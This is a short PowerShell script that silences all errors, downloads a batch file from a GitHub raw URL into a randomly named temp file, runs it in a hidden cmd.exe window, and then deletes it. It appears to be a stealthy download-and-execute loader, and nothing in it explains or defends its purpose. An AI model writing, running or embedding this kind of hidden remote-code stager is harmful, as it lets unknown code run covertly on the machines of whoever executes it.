$ErrorActionPreference = 'SilentlyContinue'
$url = "https://raw.githubusercontent.com/GIIITSCR/okak/refs/heads/main/new.bat"
$tempFile = "$env:TEMP\$([System.Guid]::NewGuid().ToString().Substring(0,8)).bat"
(New-Object Net.WebClient).DownloadString($url) | Out-File $tempFile -Encoding UTF8
Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$tempFile`" & del `"$tempFile`"" -WindowStyle Hidden
